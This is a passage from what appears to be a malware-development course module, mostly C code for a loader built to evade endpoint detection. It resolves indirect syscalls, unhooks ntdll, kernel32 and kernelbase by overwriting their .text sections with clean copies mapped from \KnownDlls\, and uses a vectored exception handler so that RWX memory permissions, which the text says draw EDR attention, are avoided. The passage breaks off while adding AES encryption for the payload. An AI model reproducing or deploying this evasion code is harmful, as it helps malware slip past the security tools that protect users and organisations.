BOOL <span class="token function">InitIndirectSyscalls</span><span class="token punctuation">(</span>OUT PNT_API Nt<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Nt<span class="token operator">-&gt;</span>bInit<span class="token punctuation">)</span>
        <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>NtOpenSection_CRC32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Nt<span class="token operator">-&gt;</span>NtOpenSection<span class="token punctuation">)</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>NtMapViewOfSection_CRC32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Nt<span class="token operator">-&gt;</span>NtMapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>NtProtectVirtualMemory_CRC32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Nt<span class="token operator">-&gt;</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>NtUnmapViewOfSection_CRC32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Nt<span class="token operator">-&gt;</span>NtUnmapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>NtAllocateVirtualMemory_CRC32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Nt<span class="token operator">-&gt;</span>NtAllocateVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FetchNtSyscall</span><span class="token punctuation">(</span>NtDelayExecution_CRC32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Nt<span class="token operator">-&gt;</span>NtDelayExecution<span class="token punctuation">)</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

    Nt<span class="token operator">-&gt;</span>bInit <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-17">Unhooking Without RWX permissions</h3>
<p>When unhooking NTDLL was performed in previous modules, they followed the same approach of modifying the <code>.text</code> section of the target DLL to grant it <code>PAGE_EXECUTE_READWRITE</code> memory permissions. This technique allowed us to overwrite <code>.text</code> with the unhooked version while still permitting execution.</p>
<p>In contrast, this module will use an improved technique to avoid the 
use of RWX memory permissions. The reason behind this technique is that 
using RWX permissions can be suspicious and may draw the attention of 
EDR systems.</p>
<p>Additionally, the loader will utilize the <code>\KnownDlls\</code> 
directory to retrieve the unhooked versions of the first three DLL 
images loaded into the local process. These initial images typically 
include <code>ntdll.dll</code>, <code>kernel32.dll</code>, and <code>kernelbase.dll</code>,
 which are precisely the areas where EDRs are most vigilant about 
detecting user-land hooks. To sidestep the need for RWX permissions, the
 loader will instead configure the memory permissions of the target 
DLL's <code>.text</code> section as <code>PAGE_READWRITE</code>, which prevents execution. However, before doing so, a <em>Vectored Exception Handler</em> (VEH) will be established. The unhooking routine is outlined in the following diagram.</p>
<img width="1000" alt="image" style="margin:auto" src="23_files/dllldr-365904197-762242cc-4b14-4757-aab1-ca31fc9f6dd9.png">
<h3 id="toc-heading-18">MapDllFromKnownDllDir Function</h3>
<p>The <code>MapDllFromKnownDllDir</code> function is shown below which maps the unhooked version of the <code>szDllName</code> DLL into the local process. If the mapping is successful, <code>MapDllFromKnownDllDir</code> returns the base address of the mapped DLL.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">LPVOID <span class="token function">MapDllFromKnownDllDir</span><span class="token punctuation">(</span>IN PWSTR szDllName<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PVOID                  pModule                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HANDLE                 hSection                 <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span>
	UNICODE_STRING         UniString               <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	OBJECT_ATTRIBUTES      ObjectiveAttr           <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	SIZE_T                 sViewSize               <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	NTSTATUS               STATUS                  <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	WCHAR                  wFullDllPath <span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> L<span class="token char">'\\'</span><span class="token punctuation">,</span> L<span class="token char">'K'</span><span class="token punctuation">,</span> L<span class="token char">'n'</span><span class="token punctuation">,</span> L<span class="token char">'o'</span><span class="token punctuation">,</span> L<span class="token char">'w'</span><span class="token punctuation">,</span> L<span class="token char">'n'</span><span class="token punctuation">,</span> L<span class="token char">'D'</span><span class="token punctuation">,</span> L<span class="token char">'l'</span><span class="token punctuation">,</span> L<span class="token char">'l'</span><span class="token punctuation">,</span> L<span class="token char">'s'</span><span class="token punctuation">,</span> L<span class="token char">'\\'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token comment">// Construct the dll's path in the knowndlls dir</span>
	<span class="token function">wcscat</span><span class="token punctuation">(</span>wFullDllPath<span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Construct a unicode string array containg the string created earlier</span>
	UniString<span class="token punctuation">.</span>Buffer <span class="token operator">=</span> <span class="token punctuation">(</span>PWSTR<span class="token punctuation">)</span>wFullDllPath<span class="token punctuation">;</span>
	UniString<span class="token punctuation">.</span>Length <span class="token operator">=</span> UniString<span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> <span class="token function">wcslen</span><span class="token punctuation">(</span>wFullDllPath<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Create the object attribute structure required for the NtOpenSection syscall</span>
	<span class="token function">InitializeObjectAttributes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ObjectiveAttr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UniString<span class="token punctuation">,</span> OBJ_CASE_INSENSITIVE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Open a section to the knowndll dll</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtOpenSection<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hSection<span class="token punctuation">,</span> SECTION_MAP_READ <span class="token operator">|</span> SECTION_MAP_EXECUTE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ObjectiveAttr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Map the section into the local process</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span>hSection<span class="token punctuation">,</span> <span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pModule<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sViewSize<span class="token punctuation">,</span> ViewUnmap<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> PAGE_READONLY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> pModule<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-19">UnhookAllLoadedDlls Function</h3>
<p>Next, we create the <code>UnhookAllLoadedDlls</code> function that serves the purpose of unhooking DLLs such as <code>ntdll.dll</code>, <code>kernel32.dll</code>, and <code>kernelbase.dll</code>. The typical code for <code>UnhookAllLoadedDlls</code> was previously discussed in <em>Module 85: NTDLL Unhooking - From KnownDlls Directory</em>. However, upon discovering the specific details of the local <code>.text</code> section, including its address and size, the <code>UnhookAllLoadedDlls</code> function additionally stores this information in global variables for potential later use by the VEH function.</p>
<p>The function does not utilize the <code>PAGE_EXECUTE_READWRITE</code> or <code>PAGE_EXECUTE_WRITECOPY</code> memory permissions. Instead, it uses the <code>PAGE_READWRITE</code> permission in its initial <code>NtProtectVirtualMemory</code> call. It's worth mentioning that since the <code>UnhookAllLoadedDlls</code> function relies on the <code>g_Nt</code> global variable, it is essential to call <code>InitIndirectSyscalls</code> beforehand to ensure that all syscalls used within <code>UnhookAllLoadedDlls</code> (as well as <code>MapDllFromKnownDllDir</code>) are valid.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">text_CRC32</span>                   	<span class="token expression"><span class="token number">0xA21C1EA3</span>    </span><span class="token comment">// CRC hash of ".text"</span></span>

<span class="token comment">// Global variables</span>
SIZE_T					g_sTextSectionSize              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
LPVOID					g_pLocalTxtSectionAddress       <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> 
LPVOID					g_pKnownDllTxtSectionAddress    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


VOID <span class="token function">UnhookAllLoadedDlls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

	NTSTATUS		STATUS		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PPEB			pPeb		<span class="token operator">=</span> <span class="token punctuation">(</span>PPEB<span class="token punctuation">)</span><span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	PLIST_ENTRY		pHeadEntry	<span class="token operator">=</span> <span class="token operator">&amp;</span>pPeb<span class="token operator">-&gt;</span>LoaderData<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">,</span>
				    pNextEntry	<span class="token operator">=</span> pHeadEntry<span class="token operator">-&gt;</span>Flink<span class="token punctuation">;</span>
	INT			    iModules	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>				<span class="token comment">// Will be used as a counter for unhooked dlls</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_Nt<span class="token punctuation">.</span>bInit<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//Skip the local .exe image</span>
	pNextEntry <span class="token operator">=</span> pNextEntry<span class="token operator">-&gt;</span>Flink<span class="token punctuation">;</span>

	<span class="token comment">// loop through all the loaded dlls</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>pNextEntry <span class="token operator">!=</span> pHeadEntry <span class="token operator">&amp;&amp;</span> iModules <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// Getting the dll's name</span>
		PLDR_DATA_TABLE_ENTRY           pLdrDataTblEntry        <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pNextEntry <span class="token operator">-</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>LDR_DATA_TABLE_ENTRY<span class="token punctuation">,</span> InMemoryOrderLinks<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		PUNICODE_STRING                 pUnicodeDllName         <span class="token operator">=</span> <span class="token punctuation">(</span>PUNICODE_STRING<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>pLdrDataTblEntry<span class="token operator">-&gt;</span>FullDllName <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>UNICODE_STRING<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// Getting the dll's local base address &amp; load the unhooked version from \KnownDlls\ dir</span>
		LPVOID				pKnownDllCopy           <span class="token operator">=</span> <span class="token function">MapDllFromKnownDllDir</span><span class="token punctuation">(</span>pUnicodeDllName<span class="token operator">-&gt;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">,</span>
						    pLocalDllCopy           <span class="token operator">=</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pLdrDataTblEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">)</span><span class="token punctuation">;</span>

		SIZE_T				sTextSectionSize                <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		LPVOID				pLocalTxtSectionAddress         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
						    pKnownDllTxtSectionAddress      <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		DWORD				dwOldProtection                 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>


		<span class="token comment">// If both pointers are retrieved</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pKnownDllCopy <span class="token operator">&amp;&amp;</span> pLocalDllCopy<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token comment">// Fetch the NT headers</span>
			PIMAGE_NT_HEADERS		pLocalImgNtHdrs		    <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLocalDllCopy <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pLocalDllCopy<span class="token punctuation">)</span><span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>pLocalImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
				<span class="token keyword">goto</span> _CLEANUP<span class="token punctuation">;</span>

			PIMAGE_SECTION_HEADER		pLocalImgSecHdr		<span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pLocalImgNtHdrs<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// Search for the .text section in the local dll</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pLocalImgNtHdrs<span class="token operator">-&gt;</span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CRCHASH</span><span class="token punctuation">(</span>pLocalImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">==</span> text_CRC32<span class="token punctuation">)</span> <span class="token punctuation">{</span>

					g_sTextSectionSize            <span class="token operator">=</span>	sTextSectionSize            <span class="token operator">=</span> pLocalImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">;</span>
					g_pLocalTxtSectionAddress     <span class="token operator">=</span>	pLocalTxtSectionAddress     <span class="token operator">=</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLocalDllCopy <span class="token operator">+</span> pLocalImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
					g_pKnownDllTxtSectionAddress  <span class="token operator">=</span>	pKnownDllTxtSectionAddress  <span class="token operator">=</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pKnownDllCopy <span class="token operator">+</span> pLocalImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Check if all variables are retrieved</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sTextSectionSize <span class="token operator">||</span> <span class="token operator">!</span>pLocalTxtSectionAddress <span class="token operator">||</span> <span class="token operator">!</span>pKnownDllTxtSectionAddress<span class="token punctuation">)</span>
				<span class="token keyword">goto</span> _CLEANUP<span class="token punctuation">;</span>

			<span class="token comment">// Change memory permissions to RW, to allow overwriting </span>
			<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLocalTxtSectionAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sTextSectionSize<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">goto</span> _CLEANUP<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Overwriting the hooked .text section with the fresh one</span>
			<span class="token function">memcpy</span><span class="token punctuation">(</span>pLocalTxtSectionAddress<span class="token punctuation">,</span> pKnownDllTxtSectionAddress<span class="token punctuation">,</span> sTextSectionSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// Reset the memory permissions to the original</span>
			<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLocalTxtSectionAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sTextSectionSize<span class="token punctuation">,</span> dwOldProtection<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">goto</span> _CLEANUP<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

		<span class="token punctuation">}</span>

_CLEANUP<span class="token operator">:</span>
		<span class="token comment">// Move to the next dll</span>
		pNextEntry <span class="token operator">=</span> pNextEntry<span class="token operator">-&gt;</span>Flink<span class="token punctuation">;</span>
		iModules<span class="token operator">++</span><span class="token punctuation">;</span>
		<span class="token comment">// Unmap the \knowndlls\ dll if found mapped</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pKnownDllCopy<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtUnmapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pKnownDllCopy<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-20">VectoredExceptionHandler Function</h3>
<p>Prior to invoking the <code>UnhookAllLoadedDlls</code> function, it's
 essential to initialize a Vectored Exception Handler (VEH). This 
initialization process has been covered several times throughout the 
course which utilizes the <code>AddVectoredExceptionHandler</code> WinAPI function.</p>
<p>Our custom VEH function itself is named <code>VectoredExceptionHandler</code>, and its functionality is outlined below:</p>
<ol>
<li>
<p>Initially, it checks if the exception code corresponds to <code>EXCEPTION_ACCESS_VIOLATION</code>. If so, it proceeds to validate the source of the exception. If the exception was triggered within the target DLL's <code>.text</code> section, it is considered a valid exception and is processed by the function. Otherwise, the function returns <code>EXCEPTION_CONTINUE_SEARCH</code>.</p>
</li>
<li>
<p>Following this, the VEH function makes a syscall to <code>NtProtectVirtualMemory</code>, which designates the target <code>.text</code> section as a <code>PAGE_EXECUTE_READWRITE</code> memory region.</p>
</li>
<li>
<p>Finally, the VEH function replaces the hooked <code>.text</code> section with an unhooked version.</p>
</li>
</ol>
<p>All of the steps mentioned above rely on the global variables initialized by the <code>UnhookAllLoadedDlls</code> function.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">LONG WINAPI <span class="token function">VectoredExceptionHandler</span><span class="token punctuation">(</span>PEXCEPTION_POINTERS pExceptionInfo<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
	
	NTSTATUS		STATUS			<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	DWORD			dwOldProtection 	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>pExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionCode <span class="token operator">==</span> EXCEPTION_ACCESS_VIOLATION <span class="token operator">&amp;&amp;</span>
		pExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionAddress <span class="token operator">&gt;=</span> g_pLocalTxtSectionAddress <span class="token operator">&amp;&amp;</span> 
		pExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionAddress <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>g_pLocalTxtSectionAddress <span class="token operator">+</span> g_sTextSectionSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_pLocalTxtSectionAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_sTextSectionSize<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">goto</span> _FAILURE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		
		<span class="token function">memcpy</span><span class="token punctuation">(</span>g_pLocalTxtSectionAddress<span class="token punctuation">,</span> g_pKnownDllTxtSectionAddress<span class="token punctuation">,</span> g_sTextSectionSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">return</span> EXCEPTION_CONTINUE_EXECUTION<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

_FAILURE<span class="token operator">:</span>
	<span class="token keyword">return</span> EXCEPTION_CONTINUE_SEARCH<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-21">Custom AES Library</h3>
<p>Next up is the encryption phase where the loader will use the <a href="https://github.com/bitcoin-core/ctaes" target="_blank">ctaes</a> library for AES-256 encryption and decryption. To integrate this library into the loader, two additional files, specifically <a href="https://github.com/bitcoin-core/ctaes/blob/master/ctaes.c" target="_blank">ctaes.c</a> and <a href="https://github.com/bitcoin-core/ctaes/blob/master/ctaes.h" target="_blank">ctaes.h</a>, need to be included.</p>
<p>To use the ctaes library for AES256 encryption, the payload should be encrypted using the following functions:</p>
<ol>
<li>
<p><code>AES256_CBC_init</code> - Initialize a <code>AES256_CBC_ctx</code> structure, that will be used for the encryption or decryption of the payload.</p>
</li>
<li>
<p><code>AES256_CBC_encrypt</code> - Applies the AES256 algorithm to encrypt a specified plaintext buffer.</p>
</li>
</ol>
<p>On the other hand, to decrypt the payload, the loader should call the following:</p>
<ol>
<li>
<p><code>AES256_CBC_init</code> - Initialize a <code>AES256_CBC_ctx</code> structure, that will be used for the encryption or decryption of the payload.</p>
</li>
<li>
<p><code>AES256_CBC_decrypt</code> - Applies the AES256 algorithm to decrypt a specified ciphertext buffer.</p>
</li>
</ol>
<p>An example of calling these functions is found <a href="https://github.com/bitcoin-core/ctaes/blob/master/test.c#L160" target="_blank">here</a>, however, the loader will further enhance the <code>AES256_CBC_encrypt</code> and <code>AES256_CBC_decrypt</code> functions in the next section.</p>
<h4 id="toc-heading-22">Enhancing AES Functions</h4>
<p>The original implementation of the encrypt and decrypt functions is shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AES256_CBC_encrypt</span><span class="token punctuation">(</span>AES256_CBC_ctx<span class="token operator">*</span> ctx<span class="token punctuation">,</span> <span class="token class-name">size_t</span> blocks<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> encrypted<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> plain<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">AESCBC_encrypt</span><span class="token punctuation">(</span>ctx<span class="token operator">-&gt;</span>ctx<span class="token punctuation">.</span>rk<span class="token punctuation">,</span> ctx<span class="token operator">-&gt;</span>iv<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> blocks<span class="token punctuation">,</span> encrypted<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

